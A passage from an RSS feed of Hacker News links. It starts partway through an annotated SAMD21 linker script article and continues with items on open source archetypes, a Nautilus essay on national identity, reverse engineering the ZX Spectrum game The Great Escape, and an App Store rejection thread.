</ul>
<pre>    <span>bootloader</span> <span>(</span><span>rx</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>0x00000000</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>BOOTLOADER_SIZE</span>
</pre>
<p>Following the bootloader is the flash memory used by the application,
called "rom" here - even though it's flash, the name is just a name
and doesn't carry special meaning.</p>
<p>The total length of the rom block is the MCU's flash size minus the
bootloader's size and any space reserved for "non-volatile memory"
by the application.</p>
<pre>   <span>rom</span> <span>(</span><span>rx</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>0x00002000</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>FLASH_SIZE</span> <span>-</span> <span>BOOTLOADER_SIZE</span> <span>-</span> <span>NVM_SIZE</span>
</pre>
<p>The "nvm" block is space set aside for the application to store
user settings and calibration data in the MCU's flash.</p>
<p>The block is located right at the end of the flash space. This
is useful because it means that it says in a fixed location
regardless of how much flash space the application takes up
in "rom". Explicitly defining this section also lets the
linker ensure that application code doesn't overwrite the
data in this region.</p>
<p>This block is marked as read-only (<code>r</code>) because flash can not
be written in the same way as normal memory, however, the
application can use the SAMD's NVM peripheral to write data in
this region.</p>
<pre>   <span>nvm</span> <span>(</span><span>r</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>FLASH_SIZE</span> <span>-</span> <span>NVM_SIZE</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>NVM_SIZE</span>
</pre>
<p>The "ram" block is mapped to the CPU's SRAM and it's where
the stack, heap, and all variables will go.</p>
<p>For the SAMD21, SRAM starts at 0x20000000 and is contiguous
for the size of the SRAM.</p>
<pre>   <span>ram</span> <span>(</span><span>rwx</span><span>)</span> <span>:</span> <span>ORIGIN</span> <span>=</span> <span>0x20000000</span><span>,</span> <span>LENGTH</span> <span>=</span> <span>SRAM_SIZE</span>
<span>}</span>
</pre>
<h2 id="sections">Sections</h2>
<p>The sections command tells the linker how to combine the
input files into an output ELF and where segments belong
in memory.</p>
<p>The linker takes a set of input files containing the "input
sections" and uses this to map them to "output sections"
which are placed in the output ELF file.</p>
<p>While the most important sections to think about here
are the ones that'll be placed into the memory (segments)
some sections are just placed in the output ELF for debugging.</p>
<p>References:</p>
<ul>
<li><a href="https://sourceware.org/binutils/docs/ld/SECTIONS.html#SECTIONS">https://sourceware.org/binutils/docs/ld/SECTIONS.html#SECTIONS</a></li>
</ul>
<pre><span>SECTIONS</span>
<span>{</span>
</pre>
<p>The text segment contains program code and read-only data.</p>
<p>References:</p>
<ul>
<li><a href="https://developer.arm.com/documentation/dui0101/a/">https://developer.arm.com/documentation/dui0101/a/</a>
Page 5, Segments</li>
<li><a href="http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections">http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections</a></li>
</ul>
<pre>   <span>.</span><span>text</span> <span>:</span>
   <span>{</span>
</pre>
<p>This segment must be 4-byte aligned as defined in ARM ELF
File Format specification.</p>
<pre>      <span>.</span> <span>=</span> <span>ALIGN</span><span>(</span><span>4</span><span>);</span>
</pre>
<p>The vector table defines the initial stack pointer and
interrupt/exception routines for the ARM CPU and device
peripherals. Every Cortex-M project needs this.</p>
<p>For the SAM D series the vector table is expected
to be at address 0x00000000 after reset. Since
flash memory starts at 0x00000000, the first values
in flash should be the vector table.</p>
<p>When defining the vector table in code you must use
<code>__attribute__ ((section(".vectors")))</code> to tell
GCC to place the vector table into the section
named ".vectors" in the input object file so that
the linker can find it.</p>
<p>Note that since this project uses the UF2 bootloader,
this actually gets placed at the beginning of the
program's flash area (0x2000). The Cortex-M allows
changing the vector table after initialization,
so the startup script sets the Vector Table Offset
Register (<code>SCB-&gt;VTOR</code>) to <code>_sfixed</code> during its
intialization. The <code>_efixed</code> symbol is unused but
included for completeness.</p>
<p>References:</p>
<ul>
<li><a href="https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf">https://ww1.microchip.com/downloads/en/DeviceDoc/SAM_D21_DA1_Family_DataSheet_DS40001882F.pdf</a>
Secion 8.3.3, Fetching of Initial Instructions</li>
<li><a href="https://static.docs.arm.com/ddi0403/eb/DDI0403E_B_armv7m_arm.pdf">https://static.docs.arm.com/ddi0403/eb/DDI0403E_B_armv7m_arm.pdf</a>
Section B1.5.3, The vector table
Section B3.2.5, Vector Table Offset Register, VTOR</li>
<li><a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux/tree/master/firmware/third_party/samd21/gcc/gcc/startup_samd21.c">startup_samd21.c</a></li>
</ul>
<pre>      <span>_sfixed</span> <span>=</span> <span>.;</span>
      <span>KEEP</span><span>(</span><span>*</span><span>(.</span><span>vectors</span> <span>.</span><span>vectors</span><span>.</span><span>*</span><span>))</span>
</pre>
<p>Include code and read-only data sections from all
input files.</p>
<p>By default, GCC places all program code into a section named
".text" and read-only data (such as const static variables) into
a section named ".rodata" in the input object files. This naming
convention is from the ELF ABI specification.</p>
<p>GCC generates three "flavors" of sections in object files:</p>
<ul>
<li><code>.{section}</code>: the basic section.</li>
<li><code>.{section}.*</code>: sections generated by <code>-ffunction-sections</code> and
<code>-fdata-sections</code> so that each function/data has a unique
section.</li>
<li><code>.gnu.linkonce.{type}.*</code>: sections generated by GCC so the
linker can remove duplicates. Seems to be related to
Vague Linking.</li>
</ul>
<p>References:</p>
<ul>
<li><a href="http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections">http://www.sco.com/developers/gabi/latest/ch4.sheader.html#special_sections</a></li>
<li><a href="https://gcc.gnu.org/onlinedocs/gcc/Vague-Linkage.html">https://gcc.gnu.org/onlinedocs/gcc/Vague-Linkage.html</a></li>
<li><a href="https://stackoverflow.com/questions/5518083/what-is-a-linkonce-section">https://stackoverflow.com/questions/5518083/what-is-a-linkonce-section</a></li>
</ul>
<pre>      <span>*</span><span>(.</span><span>text</span> <span>.</span><span>text</span><span>.</span><span>*</span> <span>.</span><span>gnu</span><span>.</span><span>linkonce</span><span>.</span><span>t</span><span>.</span><span>*</span><span>)</span>
      <span>*</span><span>(.</span><span>rodata</span> <span>.</span><span>rodata</span><span>*</span> <span>.</span><span>gnu</span><span>.</span><span>linkonce</span><span>.</span><span>r</span><span>.</span><span>*</span><span>)</span>
</pre>
<h2 id="c-c-runtime-support">C &amp; C++ runtime support</h2>
<p>The following sections are for the C/C++ runtime. These are generally used by crt0.</p>
<p>References:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Crt0">https://en.wikipedia.org/wiki/Crt0</a></li>
</ul>
<h3 id="initializers">Initializers</h3>
<ul>
<li>C++ Runtime: initializers for static variables.</li>
<li>C Runtime: designated constructors</li>
</ul>
<p>For C++, handles variables at file scope like this:</p>
<pre><span>int</span> <span>f</span> <span>=</span> <span>some_func</span><span>()</span>
</pre>
<p>For C, handles functions designated as constructors:</p>
<pre><code>void intialize_thing(void) __attribute__((constructor));
</code></pre>
<p>Executed by the C runtime at startup via <code>__libc_init_array</code>.</p>
<p>References:</p>
<ul>
<li><a href="https://github.com/gcc-mirror/gcc/blob/master/libgcc/crtstuff.c">https://github.com/gcc-mirror/gcc/blob/master/libgcc/crtstuff.c</a></li>
<li><a href="https://sourceware.org/git/?p=newlib-cygwin.git;a=blob;f=newlib/libc/misc/init.c">https://sourceware.org/git/?p=newlib-cygwin.git;a=blob;f=newlib/libc/misc/init.c</a>;</li>
<li><a href="https://gcc.gnu.org/onlinedocs/gccint/Initialization.html">https://gcc.gnu.org/onlinedocs/gccint/Initialization.html</a></li>
<li><a href="https://developer.arm.com/documentation/dui0475/h/the-arm-c-and-c---libraries/c---initialization--construction-and-destruction">https://developer.arm.com/documentation/dui0475/h/the-arm-c-and-c---libraries/c---initialization--construction-and-destruction</a></li>
<li><a href="https://stackoverflow.com/questions/15265295/understanding-the-libc-init-array">https://stackoverflow.com/questions/15265295/understanding-the-libc-init-array</a></li>
</ul>
<pre>      <span>.</span> <span>=</span> <span>ALIGN</span><span>(</span><span>4</span><span>);</span>
      <span>KEEP</span><span>(</span><span>*</span><span>(.</span><span>init</span><span>))</span>
      <span>.</span> <span>=</span> <span>ALIGN</span><span>(</span><span>4</span><span>);</span>
  …</pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.thea.codes/the-most-thoroughly-commented-linker-script/">https://blog.thea.codes/the-most-thoroughly-commented-linker-script/</a></em></p>]]>
            </description>
            <link>https://blog.thea.codes/the-most-thoroughly-commented-linker-script/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25771834</guid>
            <pubDate>Thu, 14 Jan 2021 04:05:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Family Moves from Shed to Apartment, Thanks to 8 Year Old's Plant Business]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 13 (<a href="https://news.ycombinator.com/item?id=25771412">thread link</a>) | @danhodgins
<br/>
January 13, 2021 | http://thesassyplant.com/16-family-moves-from-shed-to-apartment-thanks-to-8-year-olds-plant-business | <a href="https://web.archive.org/web/*/http://thesassyplant.com/16-family-moves-from-shed-to-apartment-thanks-to-8-year-olds-plant-business">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://thesassyplant.com/16-family-moves-from-shed-to-apartment-thanks-to-8-year-olds-plant-business</link>
            <guid isPermaLink="false">hacker-news-small-sites-25771412</guid>
            <pubDate>Thu, 14 Jan 2021 03:15:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[John Carmack Essays]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25771365">thread link</a>) | @tosh
<br/>
January 13, 2021 | https://waitwho.is/john-carmack/essays | <a href="https://web.archive.org/web/*/https://waitwho.is/john-carmack/essays">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><nav><div><p><a>Sign In</a><a href="https://waitwho.is/signup">Sign Up</a></p></div></nav><header><div><div><div><div><div><picture><source srcset="https://ucarecdn.com/13adf647-5c7e-4f4b-8750-a41a975591c5/-/resize/x550/-/format/webp/" type="image/webp"><img src="https://ucarecdn.com/13adf647-5c7e-4f4b-8750-a41a975591c5/-/resize/x550/-/format/auto/" alt="john-carmack cartoon"></picture></div></div></div><div><div><div><picture><source srcset="https://ucarecdn.com/13adf647-5c7e-4f4b-8750-a41a975591c5/-/resize/x550/-/format/webp/" type="image/webp"><img src="https://ucarecdn.com/13adf647-5c7e-4f4b-8750-a41a975591c5/-/resize/x550/-/format/auto/" alt="john-carmack cartoon"></picture></div></div></div></div><div><div><div><p>John Carmack</p><div><div><div><p><span>Subscribe</span></p><p><span>Subscribe</span></p></div></div></div></div></div></div></div><p>John Carmack is a Consulting CTO at Facebook's Oculus. He was previously CTO at Oculus  before he stepped down.  Prior to Oculus, he co-founded the video game company Id Software which revolutionized the first-person shooter games Doom and Quake. Id Software was sold to ZeniMax in 2009.
</p></header></div></div>]]>
            </description>
            <link>https://waitwho.is/john-carmack/essays</link>
            <guid isPermaLink="false">hacker-news-small-sites-25771365</guid>
            <pubDate>Thu, 14 Jan 2021 03:09:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Open Source Archetypes: A Framework for Purposeful Open Source]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25771196">thread link</a>) | @pabs3
<br/>
January 13, 2021 | https://opentechstrategies.com/archetypes | <a href="https://web.archive.org/web/*/https://opentechstrategies.com/archetypes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div id="top">
        <div>

          <center><h2>Open Source Archetypes:<br>A Framework For Purposeful Open Source</h2></center>

          <p>“Open source” means many things to many people.  Many kinds
          of projects get grouped under the label "open source", and
          they may operate in very different ways.  Sometimes it helps to think
          through how an effort’s open source approach matches its
          goals, resources, and environment.  Our
          <a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf">field guide to Open Source Archetypes</a> is designed to help
          with that thinking, by providing a common vocabulary to
          discuss open source in ways that take account of important
          differences.</p>

          <p>The guide describes and compares a number of project
          archetypes we have observed.  We prepared it in partnership
          with <a href="https://mozilla.org/">Mozilla</a>, and our
          organizations (as well
          as <a href="https://blog.jwf.io/2020/11/open-source-archetypes-unicef-open-source/">others</a>) have found it useful in deciding how to invest
          in open source endeavors.</p>

          <center><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf"><img src="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2-cover.png" alt="Cover of Open Source Archetypes v2 report."></a></center>

          <!-- Search for "vh_height" in xsl/ots.xsl. -->

          <p>We hope it is useful to you as you design open source
          initiatives, weigh tradeoffs in strategy, and pick metrics to
          track success. The archetypes we list are useful comparison
          points for anybody trying to maximize the benefits of their
          open source investment.</p>

          <center><iframe src="https://www.youtube.com/embed/Lo61OOi8_4Y?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true" width="525" height="296"></iframe></center>

          <!-- Search for "vh_height" in xsl/ots.xsl. -->

          <center><h2>Archetypes Described</h2></center>

          <center>
          <table>
            <tbody><tr><td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.13"><img src="https://opentechstrategies.com/images/noun_Welcome_Arms_538753.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.13">Wide Open</a></td>
                       <td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.10"><img src="https://opentechstrategies.com/images/noun_Rocket_780226.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.10">Rocket Ship to Mars</a></td>
                   </tr>
                   <tr><td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.8"><img src="https://opentechstrategies.com/images/noun_b2b_1528321.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.8">B2B Open Source</a></td>
                       <td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.15"><img src="https://opentechstrategies.com/images/noun_open_1280343.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.15">Specialty Library</a></td>
                   </tr>
                   <tr><td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.9"><img src="https://opentechstrategies.com/images/noun_Technology_Infrastructure_1271137.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.9">Multi-Vendor Infra</a></td>
                       <td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.14"><img src="https://opentechstrategies.com/images/noun_crowd_31671.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.14">Mass Market</a></td><td></td>
                   </tr>
                   <tr><td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.17"><img src="https://opentechstrategies.com/images/noun_River_Confluence_6285_000000.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.17">Upstream Dependency</a></td>
                       <td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.16"><img src="https://opentechstrategies.com/images/noun_Trust_Fall_26969.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.16">Trusted Vendor</a></td>
                   </tr>
                   <tr><td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.12"><img src="https://opentechstrategies.com/images/noun_Digital_ecosystem_1637682.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.12">Controlled Ecosystem</a></td>
                       <td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.18"><img src="https://opentechstrategies.com/images/noun_Bath_451748.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.18">Bathwater</a></td>
                   </tr>
                   <tr><td><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.11"><img src="https://opentechstrategies.com/images/noun_Shigarami_1927548.crop.svg"></a><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2.pdf#section*.11">Single Maintainer Houseplant</a></td>
                   </tr>
            </tbody>
          </table>
          </center>

          <center><h2>Quick Reference</h2></center>

          <p>Page 27 of the report is a Quick Reference guide to the
             archetypes.  While we recommend reading the whole report,
             we make the quick-ref available as a separate PDF here for
             convenience:</p>

          <center><a href="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2-quick-ref.pdf"><img src="https://opentechstrategies.com/archetypes-files/open-source-archetypes-v2-quick-ref.png" alt="Open Source Archetypes Quick Reference Guide (p. 27)"></a></center>

          <center><h2>Source</h2></center>

          <center><p>"Open Source Archetypes" is published under a
             <a href="https://creativecommons.org/licenses/by-sa/4.0/">CC-BY-SA</a> license and its LaTeX source is available
             <a href="https://github.com/opentechstrategies/open-source-archetypes">here</a>.</p></center>
        <!-- container -->
      </div>
      <!-- archetypes section -->
      <!-- footer section -->
      
    </div>
    <!-- main -->
    <!-- scripts -->
    <!--[if lt IE 9]>
  <script src="js/jquery.js"></script>
  <script src="css/bootstrap/js/bootstrap.js"></script>
  <script src="js/script.js"></script>
  <script src="js/target.js"></script>
  <script src="js/prefixfree.js"></script>
<![endif]-->
    
    
    
    
    
  

</div></div>]]>
            </description>
            <link>https://opentechstrategies.com/archetypes</link>
            <guid isPermaLink="false">hacker-news-small-sites-25771196</guid>
            <pubDate>Thu, 14 Jan 2021 02:46:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why a Universal Society Is Unattainable]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25771109">thread link</a>) | @CapitalistCartr
<br/>
January 13, 2021 | http://m.nautil.us/issue/95/escape/why-a-universal-society-is-unattainable | <a href="https://web.archive.org/web/*/http://m.nautil.us/issue/95/escape/why-a-universal-society-is-unattainable">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
			<p><span>O</span>n Jan. 1, 2021, five long years after the vote for what’s become known as Brexit, and numerous marches before and after that national decision, some of which attracted more than 100,000 impassioned participants, Great Britain formally severed its nearly half century-long ties with the European Union. The decision, as columnist Owen Jones described it in <i>The Guardian</i>, was to foment “an all-out culture war.”</p><p>In the 2016 vote, the majority of British people stubbornly chose for their country to be on its own and not part of a more encompassing group of societies. The vote appeared to run against the broader trend of European nations loosening their boundaries in acknowledgement of an identity that outweighs, or erases, the impor­tance of the societies themselves. With the number of societies in gener­al declining century after century,<sup>1</sup> we might take seriously the assertion that the internationalization of culture (think <i>Star Wars</i>, tequila, Mercedes-Benz) and connections (with Twitter linking people from Aa, Estonia, to Zu, Afghanistan) are a harbinger of a Berlin Wall-type border collapse, making, as the British sociologist Morris Ginsberg once put it, “The unification of mankind [is] one of the clearest trends in human history.”<sup>2</sup></p><blockquote><p>The European Union offers no grand foundation story, no venerable symbols or traditions.</p> </blockquote><p>Whatever the ultimate relationship of Great Britain and Europe may be, the current breakup underscores how deeply national identity runs through human psychology. A review of both the psychology literature and anthropological research on societies ranging from the ethnolinguistic groups of hunter-gatherers to tribes, chiefdoms, and states (less formally, “nations”),<sup>3</sup> reveal that a universal society is unattainable. Populations across the globe today may devour Starbucks, KFC, and Coca-Cola. They may enjoy Italian opera, French couture, and Persian carpets. But no matter how many exotic influences each absorbs or what foreign connections they make, nations don’t just fade away. They retain their citizens’ fierce devotion.<sup>4</sup> Societies have always traded, gifted, or taken what they want from the outer world to claim as their own, and grown all the stronger for doing so. While the erasure of borders may be laudable, nothing we know about the workings of the human mind suggests it is a realistic vision.<br></p><p><span>T</span>hroughout history, humankind has successfully er­ected umbrella organizations composed of multiple societies. That such groups fail to supersede bonds to the societies themselves is demonstrated by the most binding association of societies in the anthropological record. In northwest Amazonia reside 20 or so tribes, or language groups, known collectively as the Tukanoans. Each has its own language or dialect, some similar, some mutually unintelligible. The tribes are tied economically, each a specialist on goods it exchanges with the others. Cross-connecting them are what amount to obligatory trade relations of a novel sort: Marriage within a tribe is improper. “Those who speak the same language with us are our brothers, and we do not marry our sisters,” the people say.<sup>5</sup> Thus a bride marries into another tribe, where she learns the local tongue.</p><p>One explanation for this arrangement is that it reduces inbreeding in small societies, an incestuous act to which <i>Homo sapiens</i> has an innate abhorrence. We see this in many nonhumans as well, such as in chimpanzees, where females avoid mating with kin by likewise transferring between communities. The psychological aversion to marrying a sibling presents a far greater problem for the Tukanoans, whose numbers have been miniscule at times in the past, than for the massive countries of today. Perhaps this fear overpowered any trepidation those people have about firmly bonding their societies. The compulsory spousal exchanges have created some of the tightest alliances ever recorded, currently totaling about 30,000 Amazonian souls. Yet for all that, Tukanoan tribes remain clear and separate, each confined to specific areas.<sup>6</sup></p><blockquote><p>If a mass hypnotist caused us to forget our differences, we would scramble to invent new ones.</p> </blockquote><p>A failure of alliances to supersede people’s affiliation to their society holds true universally. Intergovernmental organizations like the European Union and the United Nations don’t earn our primary emotional commitment because they lack ingredients that make them real for the members. The EU may be the most ambitious attempt at societal integration conceived, yet few members see the EU as an entity worthy of their loyalty the way they do their countries, and for several reasons.<br></p><p>First off, the EU’s borders are indefinite—indeed, are subject to revision as states enter or go. Additionally, its members have a history of conflict dating from the Middle Ages, and a split already exists from east to west among communist and capitalist cultures. To top all that off, the EU offers no grand foundation story, no venerable symbols or traditions, and there’s little sense anyone would fight and die for Europe as they might for their nation.<sup>7</sup> That makes the EU a political coalition much like the Iroquois Confederacy once was for six American Indian tribes, or the league of states formed within what is now China during the sixth century B.C.<sup>8</sup><br></p><p>The strength of such associations wax or wane given their value at the moment. As with our personal relationships, friends can become enemies who turn into friends again, something that’s been shown for the ever-shifting relationships among many American Indian tribes.<sup>9</sup> Each country in the EU handles passports and other issues relating to its citizens’ identity and remains the focus of their self-worth, an outlook that makes its membership secondary and disposable. Analysis of the 2016 Brexit vote shows that those who most strongly think of themselves as English went against staying with the EU. Voters saw what was intended foremost to be an economic and peacekeeping tool as a threat to their identity.<sup>10</sup> The fact is the consequences of Brexit will be mostly commercial, setting into action a myriad of obstacles to trade.<sup>11</sup></p><div>
<article>
<p><a href="http://m.nautil.us/issue/26/Color/about-your-skin" data-trval="about-your-skin" data-trlbl="foc_rec" data-tract="internal_art">
<img src="http://static.nautil.us/6552_ba5451d3c91a0f982f103cdbe249bc78.png" alt="Sapolsky_TH-F1" width="314" height="177">
</a>
</p>
<div>
<p><span>
<span>

<span><a href="http://m.nautil.us/term/f/Anthropology">Also in Anthropology</a></span>&nbsp;&nbsp;</span>
</span></p><h4><a href="http://m.nautil.us/issue/26/Color/about-your-skin" data-trval="about-your-skin" data-trlbl="foc_rec" data-tract="internal_art">About Your Skin</a></h4>
<p>By Steve Paulson</p>
<p>
Skin may seem like a superficial human attribute, but it’s the first thing we notice about anyone we meet. Nina Jablonski came to this realization many years ago when she was teaching a human anatomy class to young medical students...<strong><a href="http://m.nautil.us/issue/26/Color/about-your-skin" data-trval="about-your-skin" data-trlbl="foc_rec" data-tract="internal_art">READ MORE</a></strong>
</p>

</div>

</article>
</div><p>Ironically, Britain’s relations with the EU unraveled when its self-iden­tity was under stress, with Northern Ireland and Scotland increasingly like­ly opting to secede from the UK, a fracture along ancient cultural lines that’s the norm for modern societies.<sup>12</sup> Meanwhile, the loss of Britain has invigorated the ties of the mem­ber nations to the EU, along the lines of what one sees when a group of people pull together in the face of adversity—but that doesn’t mean the divisions within the EU will disappear.<sup>13</sup></p><p>Financial and security issues hold the EU together. The same can be said for Swit­zerland, a country subject to perennial scrutiny because, as the four languages and complex territoriality of its people attest, its nationhood rests on a detailed social and political alliance between 26 local communities, or cantons. These self-governing settlements act in many respects as miniature nations nestled in a mountain landscape that enhances each one’s physical separation and autonomy.<sup>14</sup> “Each Canton has its own history, constitution and flag, and some even have an anthem,” political scientist Antoine Chollet reports, such that Swiss “citizenship refers to one who can vote and nothing more.”<sup>15</sup> Formation of the Swiss confederation required rewriting accounts of the past to maintain a sense of equality between the cantons, allowing them to survive over the centuries when they were forc­ed to negotiate their interests with far larger and more powerful neighboring countries.<sup>16</sup></p><p>The EU and Switzerland are regional entities kept intact by perceived needs to counter hazards from outsiders, a motivating factor that gives both a reasonable chance of success. An absolutely global union would have no such motivation, making it far more precarious. One possible means of attaining that unity might be to shift people’s perception of who’s an outsider. It was a point Ronald Reagan liked to make. “I occasionally think how quickly our differences worldwide would vanish if we were facing an alien threat from outside this world,” he remarked in an address to the UN. Indeed, science-fiction tales like <i>The War of the Worlds</i> depict humankind acting as one against a common enemy.</p><p>Yet even then our societies would endure the space aliens. The arrival of Martians wouldn’t make nations irrelevant any more than Europeans arriving in Australia caused the Aborigines to drop what had been several hundred clear-cut tribal groups (actually, many Aborigines first guessed that the Europeans were otherworldly, i.e., ghosts<sup>17</sup>). That would be so regardless of how much the aliens shattered the beliefs people held about their own societies, whose beloved differences would look trivial by comparison to those with the Little Green Men. Cosmopolitanism, the conviction that the diverse people of our planet will come to feel a primary connection to the human race (the term means “citizen of the cosmos”),<sup>18</sup> is a pipe dream.</p><p><span>B</span>ut what might happen if people could forgo those traits that “mark” their identities or somehow put aside the drive to categorize each other by means of such labels—to separate us from them based on language, clothing, gestures, or religious beliefs? In such a world the only reliable differences we would perceive would be between individuals—not between groups. One supposes that under such circumstances our nations would disintegrate entirely, but it’s hard to predict what would rise in their stead. Maybe our af­filiations would coalesce around local neighborhoods or around those who we know best, with the global population …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://m.nautil.us/issue/95/escape/why-a-universal-society-is-unattainable">http://m.nautil.us/issue/95/escape/why-a-universal-society-is-unattainable</a></em></p>]]>
            </description>
            <link>http://m.nautil.us/issue/95/escape/why-a-universal-society-is-unattainable</link>
            <guid isPermaLink="false">hacker-news-small-sites-25771109</guid>
            <pubDate>Thu, 14 Jan 2021 02:34:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reverse Engineering the Great Escape]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25770485">thread link</a>) | @stolen_biscuit
<br/>
January 13, 2021 | http://www.davespace.co.uk/the.great.escape/ | <a href="https://web.archive.org/web/*/http://www.davespace.co.uk/the.great.escape/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    
<h2>Reverse Engineering The Great Escape</h2>

<p><dfn>The Great Escape</dfn> is a classic 1986 prison break game for the <a href="https://en.wikipedia.org/wiki/ZX_Spectrum">48K ZX Spectrum</a>. I've spent a considerable amount of time reverse engineering its routines and documenting its workings while simultaneously reimplementing it as portable C code. The following pages describe the process I went through.</p>

<p>This is an expanded-upon write-up of some of what I can dimly recall saying while presenting <a href="http://slides.com/dpt/the-great-escape/#/">these slides</a> to my team at INSIDE Secure (formerly Metaforic, now called <a href="https://www.verimatrix.com/">Verimatrix</a>) in Glasgow at a talk in January 2016.</p>

<img src="http://www.davespace.co.uk/the.great.escape/tge/diagram.png" width="544">

<ul>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <li><i></i> <a href="http://www.davespace.co.uk/the.great.escape/intro.html">Introduction</a> – Introducing "The Great Escape"</li>
  
  
  
  <li><i></i> <a href="http://www.davespace.co.uk/the.great.escape/reversing.html">Reverse Engineering</a> – Disassembling and rebuilding the classic 48K ZX Spectrum game from 1986</li>
  
  
  
  <li><i></i> <a href="http://www.davespace.co.uk/the.great.escape/discoveries.html">Discoveries</a> – Things I found out while pulling the game apart</li>
  
  
  
  <li><i></i> <a href="http://www.davespace.co.uk/the.great.escape/c.html">C Port</a> – Porting the game to C</li>
  
  
  
  <li><i></i> <a href="http://www.davespace.co.uk/the.great.escape/legals.html">Legals</a> – Abandonware?</li>
  
  
  
  <li><i></i> <a href="http://www.davespace.co.uk/the.great.escape/links.html">Links</a> – Project links</li>
  
  
</ul>

  </section></div>]]>
            </description>
            <link>http://www.davespace.co.uk/the.great.escape/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25770485</guid>
            <pubDate>Thu, 14 Jan 2021 01:18:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple rejects games using Corona Game Engine]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25770366">thread link</a>) | @serialx
<br/>
January 13, 2021 | https://forums.solar2d.com/t/rejected-on-appstore-contains-covid-19-or-related-references-in-the-plist-or-in-your-binary/351405 | <a href="https://web.archive.org/web/*/https://forums.solar2d.com/t/rejected-on-appstore-contains-covid-19-or-related-references-in-the-plist-or-in-your-binary/351405">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-outlet">
        

  


      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
